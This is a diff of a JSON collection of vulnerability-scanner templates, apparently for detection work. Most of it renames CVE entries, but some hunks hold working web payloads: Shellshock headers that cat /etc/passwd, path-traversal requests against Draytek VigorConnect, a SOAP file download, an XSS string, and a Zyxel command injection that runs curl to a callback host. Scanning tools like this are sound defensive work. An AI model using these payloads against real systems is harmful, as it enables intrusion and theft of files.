@@ -161,7 +161,7 @@
     {
       "id": "CVE-2007-4504",
       "info": {
-        "name": "Joomla! Component RSfiles 1.0.2 - 'path' File Download",
+        "name": "Joomla! Component RSfiles <=1.0.2 - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -615,7 +615,7 @@
     {
       "id": "CVE-2010-0696",
       "info": {
-        "name": "Joomla! Component Jw_allVideos - Arbitrary File Download",
+        "name": "Joomla! Component Jw_allVideos - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -1876,7 +1876,7 @@
     {
       "id": "CVE-2010-2122",
       "info": {
-        "name": "Joomla! Component simpledownload 0.9.5 - Local File Disclosure",
+        "name": "Joomla! Component simpledownload <=0.9.5 - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -2041,7 +2041,7 @@
     {
       "id": "CVE-2010-3203",
       "info": {
-        "name": "Joomla! Component PicSell 1.0 - Local File Disclosure",
+        "name": "Joomla! Component PicSell 1.0 - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -3311,9 +3311,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -3807,7 +3807,7 @@
     {
       "id": "CVE-2015-4694",
       "info": {
-        "name": "WordPress Zip Attachments <= 1.1.4 - Arbitrary File Download",
+        "name": "WordPress Zip Attachments <= 1.1.4 - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -4927,7 +4927,7 @@
     {
       "id": "CVE-2017-11512",
       "info": {
-        "name": "ManageEngine ServiceDesk - Unauthenticated Arbitrary File Download",
+        "name": "ManageEngine ServiceDesk - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -5206,7 +5206,7 @@
     {
       "id": "CVE-2017-15363",
       "info": {
-        "name": "Typo3 Restler Extension - Local File Disclosure",
+        "name": "TYPO3 Restler - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -5597,7 +5597,7 @@
     {
       "id": "CVE-2017-7615",
       "info": {
-        "name": "CVE-2017-7615",
+        "name": "MantisBT <=2.30 - Arbitrary Password Reset and Unauthenticated Admin Access",
         "severity": "high"
       },
       "requests": [
@@ -5758,7 +5758,7 @@
     {
       "id": "CVE-2017-9841",
       "info": {
-        "name": "PHPUnit < 4.8.28 and 5.x - 5.63 Arbitrary Code Execution",
+        "name": "PHPUnit - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -5777,7 +5777,7 @@
     {
       "id": "CVE-2018-0127",
       "info": {
-        "name": "Cisco RV132W and RV134W Router Information Disclosure",
+        "name": "Cisco RV132W/RV134W Router - Information Disclosure",
         "severity": "critical"
       },
       "requests": [
@@ -5840,7 +5840,7 @@
     {
       "id": "CVE-2018-1000226",
       "info": {
-        "name": "Cobbler versions 2.6.11+, (2.0.0+ or older versions) - Authentication Bypass",
+        "name": "Cobbler - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -5884,7 +5884,7 @@
     {
       "id": "CVE-2018-1000861",
       "info": {
-        "name": "Jenkins 2.138 Remote Command Execution",
+        "name": "Jenkins - Remote Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -5962,7 +5962,7 @@
     {
       "id": "CVE-2018-10562",
       "info": {
-        "name": "Dasan GPON Devices - Remote Code Execution (Unauthenticated)",
+        "name": "Dasan GPON Devices - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -6159,7 +6159,7 @@
     {
       "id": "CVE-2018-1207",
       "info": {
-        "name": "Dell iDRAC7 and iDRAC8 Devices Code Injection/RCE",
+        "name": "Dell iDRAC7/8 Devices - Remote Code Injection",
         "severity": "critical"
       },
       "requests": [
@@ -6203,7 +6203,7 @@
     {
       "id": "CVE-2018-12300",
       "info": {
-        "name": "Seagate NAS OS 4.3.15.1 - Open redirect",
+        "name": "Seagate NAS OS 4.3.15.1 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -6233,7 +6233,7 @@
     {
       "id": "CVE-2018-12634",
       "info": {
-        "name": "Exposed CirCarLife System Log",
+        "name": "CirCarLife Scada <4.3 - System Log Exposure",
         "severity": "critical"
       },
       "requests": [
@@ -6264,7 +6264,7 @@
     {
       "id": "CVE-2018-1273",
       "info": {
-        "name": "Spring Data Commons Unauthenticated RCE",
+        "name": "Spring Data Commons - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -6316,7 +6316,7 @@
     {
       "id": "CVE-2018-13379",
       "info": {
-        "name": "FortiOS - Credentials Disclosure",
+        "name": "Fortinet FortiOS - Credentials Disclosure",
         "severity": "critical"
       },
       "requests": [
@@ -6347,7 +6347,7 @@
     {
       "id": "CVE-2018-13980",
       "info": {
-        "name": "Zeta Producer Desktop CMS 14.2.0 - Local File Disclosure",
+        "name": "Zeta Producer Desktop CMS 14.2.0 - Arbitrary File Retrieval",
         "severity": "medium"
       },
       "requests": [
@@ -6438,7 +6438,7 @@
     {
       "id": "CVE-2018-14916",
       "info": {
-        "name": "Loytec LGATE-902 Directory Traversal",
+        "name": "Loytec LGATE-902 <6.4.2 - Local File Inclusion",
         "severity": "critical"
       },
       "requests": [
@@ -6500,7 +6500,7 @@
     {
       "id": "CVE-2018-15517",
       "info": {
-        "name": "D-LINK Central WifiManager Server-Side Request Forgery",
+        "name": "D-Link Central WifiManager - Server-Side Request Forgery",
         "severity": "high"
       },
       "requests": [
@@ -6590,7 +6590,7 @@
     {
       "id": "CVE-2018-16167",
       "info": {
-        "name": "LogonTracer 1.2.0 - Remote Code Execution (Unauthenticated)",
+        "name": "LogonTracer <=1.2.0 - Remote Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -6724,7 +6724,7 @@
     {
       "id": "CVE-2018-16763",
       "info": {
-        "name": "fuelCMS 1.4.1 - Remote Code Execution",
+        "name": "FUEL CMS 1.4.1 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -6738,7 +6738,7 @@
     {
       "id": "CVE-2018-16836",
       "info": {
-        "name": "Rubedo CMS 3.4.0 - Directory Traversal",
+        "name": "Rubedo CMS <=3.4.0 - Directory Traversal",
         "severity": "critical"
       },
       "requests": [
@@ -6753,7 +6753,7 @@
     {
       "id": "CVE-2018-17246",
       "info": {
-        "name": "Kibana Local File Inclusion",
+        "name": "Kibana - Local File Inclusion",
         "severity": "critical"
       },
       "requests": [
@@ -6782,7 +6782,7 @@
     {
       "id": "CVE-2018-17431",
       "info": {
-        "name": "Comodo Unified Threat Management Web Console 2.7.0 - RCE",
+        "name": "Comodo Unified Threat Management Web Console - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -6903,7 +6903,7 @@
     {
       "id": "CVE-2018-18925",
       "info": {
-        "name": "Gogs - Remote Code Execution (CVE-2018-18925)",
+        "name": "Gogs (Go Git Service) 0.11.66 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -7053,7 +7053,7 @@
     {
       "id": "CVE-2018-20985",
       "info": {
-        "name": "WordPress Plugin WP Payeezy Pay 2.97 - Local File Inclusion",
+        "name": "WordPress Payeezy Pay <=2.97 - Local File Inclusion",
         "severity": "critical"
       },
       "requests": [
@@ -7127,7 +7127,7 @@
     {
       "id": "CVE-2018-2894",
       "info": {
-        "name": "Oracle WebLogic RCE",
+        "name": "Oracle WebLogic Server - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -7205,7 +7205,7 @@
     {
       "id": "CVE-2018-3810",
       "info": {
-        "name": "WordPress Smart Google Code Inserter Authentication Bypass",
+        "name": "Oturia WordPress Smart Google Code Inserter <3.5 - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -7290,7 +7290,7 @@
     {
       "id": "CVE-2018-6008",
       "info": {
-        "name": "Joomla! Component Jtag Members Directory 5.3.7 - Arbitrary File Download",
+        "name": "Joomla! Component Jtag Members Directory 5.3.7 - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -7380,7 +7380,7 @@
     {
       "id": "CVE-2018-7600",
       "info": {
-        "name": "Drupal Drupalgeddon 2 RCE",
+        "name": "Drupal - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -7394,7 +7394,7 @@
     {
       "id": "CVE-2018-7602",
       "info": {
-        "name": "Drupal Remote Code Execution Vulnerability",
+        "name": "Drupal - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -7411,7 +7411,7 @@
     {
       "id": "CVE-2018-7662",
       "info": {
-        "name": "CouchCMS <= 2.0 - Full Path Disclosure",
+        "name": "CouchCMS <= 2.0 - Path Disclosure",
         "severity": "medium"
       },
       "requests": [
@@ -7574,7 +7574,7 @@
     {
       "id": "CVE-2018-9205",
       "info": {
-        "name": "Drupal avatar_uploader v7.x-1.0-beta8 Local File Inclusion",
+        "name": "Drupal avatar_uploader v7.x-1.0-beta8 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -8268,7 +8268,7 @@
     {
       "id": "CVE-2019-16123",
       "info": {
-        "name": "PilusCart <= 1.4.1 - Local File Disclosure",
+        "name": "PilusCart <= 1.4.1 - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -8372,7 +8372,7 @@
     {
       "id": "CVE-2019-16759",
       "info": {
-        "name": "vBulletin v5.0.0-v5.5.4 Remote Command Execution",
+        "name": "vBulletin v5.0.0-v5.5.4 - Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
@@ -8505,7 +8505,7 @@
     {
       "id": "CVE-2019-17506",
       "info": {
-        "name": "DLINK DIR-868L & DIR-817LW Info Leak",
+        "name": "D-Link DIR-868L & DIR-817LW - Information Disclosure",
         "severity": "critical"
       },
       "requests": [
@@ -8687,7 +8687,7 @@
     {
       "id": "CVE-2019-19908",
       "info": {
-        "name": "phpMyChat-Plus XSS",
+        "name": "phpMyChat-Plus - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -8702,7 +8702,7 @@
     {
       "id": "CVE-2019-19985",
       "info": {
-        "name": "WordPress Plugin Email Subscribers & Newsletters 4.2.2 - Unauthenticated File Download",
+        "name": "WordPress Email Subscribers & Newsletters <4.2.2 - Arbitrary File Retrieval",
         "severity": "medium"
       },
       "requests": [
@@ -8732,7 +8732,7 @@
     {
       "id": "CVE-2019-20141",
       "info": {
-        "name": "Neon Dashboard - XSS Reflected",
+        "name": "Neon Dashboard - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -8958,7 +8958,7 @@
     {
       "id": "CVE-2019-3912",
       "info": {
-        "name": "LabKey Server < 18.3.0 - Open redirect",
+        "name": "LabKey Server < 18.3.0 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -9399,7 +9399,7 @@
     {
       "id": "CVE-2019-9955",
       "info": {
-        "name": "Zyxel Reflected Cross-site Scripting",
+        "name": "Zyxel - Reflected Cross-site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10371,7 +10371,7 @@
     {
       "id": "CVE-2020-18268",
       "info": {
-        "name": "Z-BlogPHP 1.5.2 Open redirect",
+        "name": "Z-BlogPHP 1.5.2 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -10604,7 +10604,7 @@
     {
       "id": "CVE-2020-22840",
       "info": {
-        "name": "b2evolution CMS Open redirect",
+        "name": "b2evolution CMS - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -10739,7 +10739,7 @@
     {
       "id": "CVE-2020-24391",
       "info": {
-        "name": "Mongo-Express Remote Code Execution",
+        "name": "Mongo-Express - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10755,7 +10755,7 @@
     {
       "id": "CVE-2020-24550",
       "info": {
-        "name": "CVE-2020-24550",
+        "name": "EpiServer <13.2.7 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -10785,7 +10785,7 @@
     {
       "id": "CVE-2020-24579",
       "info": {
-        "name": "DLINK DSL 2888a RCE",
+        "name": "D-Link DSL 2888a - Remote Command Execution",
         "severity": "high"
       },
       "requests": [
@@ -10893,7 +10893,7 @@
     {
       "id": "CVE-2020-25495",
       "info": {
-        "name": "SCO Openserver 5.0.7 - 'section' Reflected XSS",
+        "name": "SCO Openserver 5.0.7 - 'section' Cross-Site scripting",
         "severity": "medium"
       },
       "requests": [
@@ -10960,9 +10960,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "content-type": "text/xml",
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -11320,7 +11320,7 @@
     {
       "id": "CVE-2020-29453",
       "info": {
-        "name": "Jira Server Pre-Auth Limited Arbitrary File Read",
+        "name": "Jira Server Pre-Auth - Arbitrary File Retrieval (WEB-INF, META-INF)",
         "severity": "medium"
       },
       "requests": [
@@ -11351,7 +11351,7 @@
     {
       "id": "CVE-2020-3452",
       "info": {
-        "name": "CVE-2020-3452",
+        "name": "Cisco Adaptive Security Appliance (ASA) and Firepower Threat Defense (FTD) - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -11491,7 +11491,7 @@
     {
       "id": "CVE-2020-35736",
       "info": {
-        "name": "GateOne Arbitrary File Download",
+        "name": "GateOne 1.1 - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -11506,7 +11506,7 @@
     {
       "id": "CVE-2020-35749",
       "info": {
-        "name": "Simple Job Board < 2.9.4 - Authenticated Path Traversal Leading to Arbitrary File Download",
+        "name": "Simple Job Board < 2.9.4 -Arbitrary File Retrieval (Authenticated)",
         "severity": "high"
       },
       "requests": [
@@ -11654,7 +11654,7 @@
     {
       "id": "CVE-2020-36365",
       "info": {
-        "name": "Smartstore < 4.1.0 - Open redirect",
+        "name": "Smartstore < 4.1.0 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
@@ -12285,7 +12285,7 @@
     {
       "id": "CVE-2020-9054",
       "info": {
-        "name": "ZyXEL NAS Firmware 5.21- Remote Code Execution",
+        "name": "Zyxel NAS Firmware 5.21- Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -12421,7 +12421,7 @@
     {
       "id": "CVE-2020-9490",
       "info": {
-        "name": "CVE-2020-9490",
+        "name": "Apache HTTP Server 2.4.20-2.4.43 - HTTP/2 Cache-Digest DoS",
         "severity": "high"
       },
       "requests": [
@@ -12589,6 +12589,38 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/cache/backup/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-20123",
+      "info": {
+        "name": "Draytek VigorConnect - Unauthenticated Local File Inclusion DownloadFileServlet",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything",
+            "{{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-20124",
+      "info": {
+        "name": "Draytek VigorConnect - Unauthenticated Local File Inclusion WebServlet",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../etc/passwd",
+            "{{BaseURL}}/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../windows/win.ini"
           ]
         }
       ]
@@ -12836,7 +12868,7 @@
     {
       "id": "CVE-2021-21816",
       "info": {
-        "name": "D-LINK DIR-3040 - Syslog Information Disclosure",
+        "name": "D-Link DIR-3040 - Syslog Information Disclosure",
         "severity": "medium"
       },
       "requests": [
@@ -13701,7 +13733,7 @@
     {
       "id": "CVE-2021-24997",
       "info": {
-        "name": "CVE-2021-24997",
+        "name": "Wordpress Guppy <=1.1 - User ID Disclosure",
         "severity": "medium"
       },
       "requests": [
@@ -13850,7 +13882,7 @@
     {
       "id": "CVE-2021-25118",
       "info": {
-        "name": "Yoast SEO < 17.3 - Unauthenticated Full Path Disclosure",
+        "name": "Yoast SEO < 17.3 - Path Disclosure",
         "severity": "medium"
       },
       "requests": [
@@ -14539,7 +14571,7 @@
     {
       "id": "CVE-2021-30151",
       "info": {
-        "name": "CVE-2021-30151",
+        "name": "Sidekiq 5.1.3 and 6.x-6.2.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -15640,7 +15672,7 @@
     {
       "id": "CVE-2021-39316",
       "info": {
-        "name": "DZS Zoomsounds < 6.50 - Unauthenticated Arbitrary File Download",
+        "name": "Wordpress DZS Zoomsounds <= 6.50 - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -16004,7 +16036,7 @@
     {
       "id": "CVE-2021-41293",
       "info": {
-        "name": "ECOA Building Automation System - Local File Disclosure",
+        "name": "ECOA Building Automation System - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -17012,7 +17044,7 @@
     {
       "id": "CVE-2022-0540",
       "info": {
-        "name": "Atlassian Jira - Authentication bypass in Seraph",
+        "name": "Atlassian Jira Seraph- Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -17149,7 +17181,7 @@
     {
       "id": "CVE-2022-1119",
       "info": {
-        "name": "WordPress Simple File List < 3.2.8 - Unauthenticated Arbitrary File Download",
+        "name": "WordPress Simple File List < 3.2.8 - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -17704,6 +17736,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/carbon/admin/login.jsp?loginStatus=false&errorCode=%27);alert(document.domain)//"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-30525",
+      "info": {
+        "name": "Zyxel Firewall - Unauthenticated RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /ztp/cgi-bin/handler HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"port\":\"4\",\"vlan_tagged\":\"1\",\"vlanid\":\"5\",\"mtu\":\"; curl {{interactsh-url}};\",\"data\":\"hi\"}\n"
           ]
         }
       ]
